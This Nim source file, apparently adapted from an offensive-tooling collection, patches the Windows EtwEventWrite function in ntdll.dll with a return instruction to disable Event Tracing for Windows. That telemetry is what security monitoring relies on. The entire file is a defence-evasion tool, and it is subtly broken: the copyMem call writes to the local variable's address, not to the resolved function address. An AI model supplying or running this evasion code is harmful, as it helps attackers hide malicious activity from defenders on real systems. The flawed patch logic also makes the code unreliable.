#[
Nim-lang code snippet to pathing Event Tracing for Windows (ETW) via WinApi without using the Winim library.
]#
type
    LPCSTR* = cstring
    DWORD* = int
    PDWORD* = int

# https://raw.githubusercontent.com/byt3bl33d3r/OffensiveNim/master/src/etw_patch_bin.nim
when defined amd64:
    echo "[*] Running in x64 process"
    const patch: array[1, byte] = [byte 0xc3]
elif defined i386:
    echo "[*] Running in x86 process"
    const patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]

#[
    HMODULE LoadLibraryA(
    [in] LPCSTR lpLibFileName
    );
]#
proc LoadLibrary*(lpLibFileName: LPCSTR): int
  {.discardable, stdcall, dynlib: "kernel32", importc: "LoadLibraryA".}

#[
    FARPROC GetProcAddress(
    [in] HMODULE hModule,
    [in] LPCSTR  lpProcName
    );
]#
proc GetProcAddress*(hModule: int, lpProcName: LPCSTR): int 
  {.discardable, stdcall, dynlib: "kernel32", importc: "GetProcAddress".}

#[
    BOOL VirtualProtect(
    [in]  LPVOID lpAddress,
    [in]  SIZE_T dwSize,
    [in]  DWORD  flNewProtect,
    [out] PDWORD lpflOldProtect
    );
]#
proc VirtualProtect*(lpAddress: int, sizeT: int, dword: int, pdword: pointer): bool
  {.discardable, stdcall, dynlib: "kernel32", importc: "VirtualProtect".}

var loadNtdll = LoadLibrary("ntdll.dll")
if loadNtdll == 0:
  echo "[X] Failed to load ntdll.dll"
else:
  echo("[*] Ntdll.dll loaded.")

var funcAddr = GetProcAddress(loadNtdll, "EtwEventWrite")
if funcAddr == 0:
  echo("[X] Failed to get the address of 'EtwEventWrite'.")
else:
  echo("[*] Got the 'EtwEventWrite' function address successfuly.")

var op : DWORD = 0
var t : DWORD = 0 

if (VirtualProtect(funcAddr, patch.len, 0x40, addr op)):
  echo "[*] Applying patch"
  copyMem(addr funcAddr, unsafeAddr patch, patch.len)
  if (VirtualProtect(funcAddr, patch.len, op, addr t)):
    echo("[*] ETW blocked by patch: true")
  else:
    echo("[X] ETW blocked by patch: false")
